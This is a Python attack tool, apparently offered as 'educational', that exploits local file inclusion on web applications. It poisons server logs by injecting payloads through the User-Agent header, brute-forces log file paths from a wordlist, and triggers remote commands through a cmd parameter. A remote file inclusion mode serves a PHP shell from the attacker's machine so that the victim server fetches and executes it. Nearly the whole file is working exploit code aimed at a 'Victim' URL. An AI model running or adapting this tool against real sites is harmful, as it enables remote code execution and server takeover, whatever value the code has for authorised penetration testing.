#!/usr/bin/env python3
# Author: coldtears
# For educational purposes only.
# References:
# https://www.thegeekstuff.com/2011/08/linux-var-log-files/ 
# https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1 

import requests
import argparse
import re
import time
import os
from colorama import Fore, Style, init
from fake_useragent import UserAgent
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer


init(autoreset=True)
ua = UserAgent()

logo = r"""
              _
   ___  ___  (_)__ ___  ___    ___  __ __
  / _ \/ _ \/ (_-</ _ \/ _ \_ / _ \/ // /
 / .__/\___/_/___/\___/_//_(_) .__/\_, /
/_/                         /_/   /___/
"""

color1 = '\033[38;2;240;240;240m'
color2 = '\033[38;2;210;210;210m'
color3 = '\033[38;2;180;180;180m'
reset = '\033[0m'

print(Fore.LIGHTGREEN_EX + logo)
print(f'{color1}by{reset} {color2}c0ld{reset}{color3}t3ars{reset}')

def detect_query(url):
    match = re.search(r'\?([^#]+)', url)
    return match.group(1).split('&') if match else []

def parse_cookies(cookie_str):
    return dict(pair.strip().split("=", 1) for pair in cookie_str.split(";")) if cookie_str else {}

def exploit_log(url, log_path, cookies, cmd, payloads):
    session = requests.Session()
    
    try:
        base_url = url.split('?')[0]
        query_param = url.split('?')[1].split('=')[0]
    except IndexError:
        print(f"{Fore.RED}[!] Invalid URL format{Style.RESET_ALL}")
        return False

    for payload in payloads:
        payload = payload.strip()
        if not payload:
            continue

        headers = {"User-Agent": payload}
        print(f"{Fore.YELLOW}[+] Poisoning with payload: {payload}{Style.RESET_ALL}")

        try:
            session.get(url, headers=headers, cookies=cookies, timeout=5)
            print(f"{Fore.GREEN}[+] Poisoned successfully{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Poisoning failed: {e}{Style.RESET_ALL}")
            continue

        time.sleep(1.5)

        trigger_url = f"{base_url}?{query_param}={log_path}&cmd={cmd}"
        print(f"{Fore.YELLOW}[+] Triggering command: {trigger_url}{Style.RESET_ALL}")

        try:
            resp = session.get(trigger_url, cookies=cookies, timeout=10)
            if 'shell:' in resp.text:
                print(Fore.CYAN + "[+] Output:" + Style.RESET_ALL)
                print(resp.text.split('shell:')[-1])
                return True
            else:
                print(f"{Fore.RED}[!] No output received from payload{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Trigger error: {e}{Style.RESET_ALL}")

    return False

def exploit_rfi(url, param, rhost, rport, cookies, args):
    print(f"{Fore.YELLOW}[+] Attempting RFI injection...{Style.RESET_ALL}")
    
    payload_file = os.path.basename(args.lfile)
    shell_url = f"http://{rhost}:{rport}/{payload_file}&cmd={args.exec}"

    try:
        if '=' not in param:
            return False
        base_param = param.split('=')[0]
        rfi_url = url.replace(param, f"{base_param}={shell_url}")

        print(f"{Fore.CYAN}[i] Sending RFI payload to: {rfi_url}{Style.RESET_ALL}")

        try:
            response = requests.get(rfi_url, cookies=cookies, timeout=10, allow_redirects=False)

            print(f"{Fore.CYAN}[INFO] Headers: {dict(response.headers)}{Style.RESET_ALL}")

            if response.text.strip():
                print(f"{Fore.CYAN}[+] Output from victim (raw):{Style.RESET_ALL}")
                print(response.text.strip())
                return True
            else:
                print(f"{Fore.RED}[!] No output returned from server.{Style.RESET_ALL}")

            return True

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Request error: {e}{Style.RESET_ALL}")
            return False

    except Exception as e:
        print(f"{Fore.RED}[!] RFI error: {e}{Style.RESET_ALL}")
        return False

def start_local_server(port, args):
    
    class CustomHandler(SimpleHTTPRequestHandler):
        def translate_path(self, path):
            return args.lfile

        def do_GET(self):
            self.path = '/' + os.path.basename(args.lfile)
            return SimpleHTTPRequestHandler.do_GET(self)

    def run():
        server_address = ('0.0.0.0', port)
        try:
            httpd = HTTPServer(server_address, CustomHandler)
            print(f"{Fore.GREEN}[+] Serving {args.lfile} on port {port}...{Style.RESET_ALL}")
            httpd.serve_forever()
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to start local server: {e}{Style.RESET_ALL}")

    thread = threading.Thread(target=run)
    thread.daemon = True
    thread.start()
    time.sleep(1)

def test_log(url, param, word, cookies, cmd, payloads):
    try:
        base_url = url.split('?')[0]
        key = param.split('=')[0]
        fuzzed_url = f"{base_url}?{key}={word}"

        res = requests.get(fuzzed_url, cookies=cookies, timeout=5)

        if any(kw in res.text for kw in ['Linux x86_64', 'User-Agent', 'Host:', 'Accept-Language']):
            print(f"{Fore.GREEN}[+] Found log: {word}{Style.RESET_ALL}")
            if exploit_log(fuzzed_url, word, cookies, cmd, payloads):
                return True
    except Exception as e:
        return False
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-w', '--wordlist', default='src/wordlist.txt')
    parser.add_argument('--cookie', help='cookies for search')
    parser.add_argument('-e', '--exec', required=True, help='remote command to execute')
    parser.add_argument('-p', '--payloads', default='src/payloads.txt', help='list of payloads to inject via User-Agent')
    parser.add_argument('--rfi', action='store_true', help='Enable RFI mode')
    parser.add_argument('--lhost', default='localhost', help='Local host to serve payload (default: localhost)')
    parser.add_argument('--lport', type=int, default=14852, help='Local port to serve payload (default: 14852)')
    parser.add_argument('--lfile', default='shell.php', help='Local file to serve as payload (default: src/shell.php)')
    parser.add_argument('--rhost', default='localhost', help='Remote host IP serving payload')
    parser.add_argument('--rport', type=int, help='Port on remote host serving payload')

    args = parser.parse_args()
    cookies = parse_cookies(args.cookie)

    print(f"{Fore.WHITE}[INFO] Victim: {args.url}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}[INFO] Wordlist: {args.wordlist}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}[INFO] Payloads: {args.payloads}{Style.RESET_ALL}")

    if not os.path.isfile(args.lfile):
        print(f"{Fore.RED}[!] File '{args.lfile}' does not exist.{Style.RESET_ALL}")
        return

    print(f"{Fore.WHITE}[INFO] Starting local HTTP server on port {args.lport}{Style.RESET_ALL}")
    start_local_server(args.lport, args)

    params = detect_query(args.url)
    if not params:
        print(f"{Fore.RED}[!] No query param found{Style.RESET_ALL}")
        return

    if args.rfi:
        print(f"{Fore.YELLOW}[+] Switching to RFI exploitation mode...{Style.RESET_ALL}")
        for param in params:
            success = exploit_rfi(args.url, param, args.rhost, args.rport, cookies, args)
            if success:
                print(f"{Fore.GREEN}[+] RFI exploit triggered successfully!{Style.RESET_ALL}")
                return
        print(f"{Fore.RED}[!] RFI exploit failed.{Style.RESET_ALL}")

    try:
        with open(args.wordlist) as f:
            words = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Wordlist not found: {args.wordlist}{Style.RESET_ALL}")
        return

    try:
        with open(args.payloads) as f:
            payloads = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Payloads file not found: {args.payloads}{Style.RESET_ALL}")
        return

    for word in words:
        for param in params:
            success = test_log(args.url, param, word, cookies, args.exec, payloads)
            if success:
                print(f"{Fore.GREEN}[+] Success exploit!{Style.RESET_ALL}")
                return

    print(f"{Fore.RED}[!] No accessible log found{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
